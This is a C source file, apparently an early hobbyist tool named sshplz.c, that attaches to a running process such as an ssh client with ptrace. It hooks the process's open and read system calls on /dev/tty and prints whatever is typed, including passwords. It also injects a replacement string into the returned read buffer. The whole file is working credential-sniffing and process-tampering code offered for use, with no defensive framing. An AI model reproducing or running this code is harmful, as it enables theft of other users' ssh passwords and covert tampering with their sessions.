/**************************************************************
 *  sshplz.c - sniff out passwords from ssh? kthnkzby
 */

#define PROG "Z34107"
#define VERSION "v0.01"
#define AUTHOR "pasv (pasvninja@gmail.com)"

//#include <linux/user.h>
//#include <linux/dirent.h> //also evil
#include <linux/types.h>
#include <sys/reg.h> //i hate this file
#include <sys/user.h>
#include <sys/procfs.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <signal.h>
//#include <sys/types.h>
#include <sys/wait.h>
#include <asm/unistd.h>
//#include <dirent.h>
#include <strings.h>


struct linux_dirent64 {
	__u64 d_ino;
	__s64 d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[0];
};


void getdata(pid_t child, long addr, char *str, int len) {
    char *laddr;
    int i, j;
    union u {
            long val;
            char chars[sizeof(long)];
    }data;
    i = 0;
    j = len / sizeof(long);
    laddr = str;
    while(i < j) {
        data.val = ptrace(PTRACE_PEEKDATA,
                          child, addr + i * 4,
                          NULL);
        memcpy(laddr, data.chars, sizeof(long));
        ++i;
        laddr += sizeof(long);
    }
    j = len % sizeof(long);
    if(j != 0) {
        data.val = ptrace(PTRACE_PEEKDATA,
                          child, addr + i * 4,
                          NULL);
        memcpy(laddr, data.chars, j);
    }
    str[len] = '\0';
}

void putdata(pid_t child, long addr, char *str, int len) {
    char *laddr;
    int i, j;
    union u {
            long val;
            char chars[sizeof(long)];
    }data;
    i = 0;
    j = len / sizeof(long);
    laddr = str;
    while(i < j) {
        memcpy(data.chars, laddr, sizeof(long));
        ptrace(PTRACE_POKEDATA, child,
               addr + i * 4, data.val);
        ++i;
        laddr += sizeof(long);
    }
    j = len % sizeof(long);
    if(j != 0) {
        memcpy(data.chars, laddr, j);
        ptrace(PTRACE_POKEDATA, child,
               addr + i * 4, data.val);
    }
}

void p_getstr(int pid, char *str, long addr) {
	int i=0,j=0;
	long temp;
	while(1) {
		temp=ptrace(PTRACE_PEEKDATA, pid, addr+(4*i), 0);
		memcpy(str+(4*i), &temp, 4);
		for(j=0;j<4;j++) {
			if(str[(4*i)+j] == '\0') return;
		}
		i++;
	}
}

int syscall_open(int pid, struct user_regs_struct regs, int *ret) {
	long path_addr;
	char *path= (char *)malloc(1000);
	int flags;
	//regs.eax = 0;
	static int in_syscall;
	static int is_match;
	if(*ret) return 0; // skip subsequent TTY calls, they're all the same FD anyway
	if(in_syscall == 0) {
		in_syscall=1;
		path_addr=ptrace(PTRACE_PEEKUSER, pid, EBX*4, 0);
		flags=ptrace(PTRACE_PEEKUSER, pid, ECX*4, 0);
		p_getstr(pid, path, path_addr);
		
		if(strstr(path, "/dev/tty") != NULL) {
		    printf("We got a match!");
		    is_match = 1;
		    //putdata(pid, path_addr, "/noexist\0", 9)
		    
		}
		printf("open(%s,%x)!\n", path, flags);
	}
	else { // this is the syscall exiting
	    in_syscall=0;
	    if(is_match) {
		*ret = regs.eax;
		is_match = 0;
	    }
	    else {
		*ret=0;
	    }
	}
}



// simple modification test for read :) works on netcat, works on cat, more tests needed
char *syscall_read(int pid, struct user_regs_struct regs, int *ret) {
	static in_syscall;
	static int fd;
	unsigned int len;
	static long str_addr;
	char *sniffed= (char *)malloc(1000);
	if(in_syscall == 0) {
	    fd=ptrace(PTRACE_PEEKUSER, pid, EBX*4, 0); // get FD #
	    if(fd == *ret && *ret) { // basically if the TTY was opened by SSH..
		str_addr = ptrace(PTRACE_PEEKUSER, pid, ECX*4,0); // get str_addr	
		len = regs.edx;
	    }
	    else {
		str_addr = 0;
	    }
	    in_syscall = 1;
	}
	else {
	    if(*ret) {
		if(str_addr == 0) { return 0; } // not our selected FD!
		getdata(pid, str_addr, (char *)sniffed, regs.eax);  // eax has the read len
		printf("%d = read(%d,\"%s\", %u)!\n", regs.eax, fd, sniffed,len);
		// *ret=0;
		// attempting to modify processes returned read buffer ;) should be SLOW
		if(strstr(sniffed, "redirect me") != NULL) {
		    printf("found key attempting to modify return value...\n");
		    putdata(pid, str_addr, "redirect success\0", 17);
		    regs.eax=17; // this will segfault buffers not meant for 17> // return value
		    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
		    printf("injected! setting process to continue.\n");
		}
	    }
	    in_syscall = 0;
	}
}


int hookem(int pid) {
	if(pid == 0 || pid == 22) return;
	printf("Starting hookem() on pid %d\n", pid);
	int w;
	int *ret=(int *)malloc(sizeof(int));
	*ret=0;
	struct user_regs_struct regz;

/*	
	long arg;
	int procfd;
	char procpath[MAXPATHLEN];

	sprintfs(procpath, "/proc/%d", pid);
	procfd=open(procpath, O_RDWR|O_EXCL);
	arg=PR_RLC;
	ioctl(procfd, PIOCSET, &arg);
	arg=PR_FORK;
	ioctl(procfd, PIOCSET, &arg); // thank you strace
*/	
	
	if(ptrace(PTRACE_ATTACH, pid, (char *) 1, NULL) != 0) { printf ("ptrace() phailed and so did you\n"); exit(-1); }
	printf("connected!\n");
	/* the syscall taker loop */
	while(1) {
		wait(&w);
		if(WIFEXITED(w)) break;
		ptrace(PTRACE_GETREGS, pid, 0, &regz);
		switch (regz.orig_eax) {
			case __NR_open: syscall_open(pid, regz, ret); break; // various
			case __NR_read: syscall_read(pid, regz, ret); break; // various

		}
		ptrace(PTRACE_SYSCALL, pid, 0, 0);
	}
}

int main (int argc, char **argv) {
	int pid;
	int target_list[1000];
	nice(-19);
	// get_procs(target_list);
	pid=atoi(argv[1]); // Just test it on one pid for now
	hookem(pid);
}

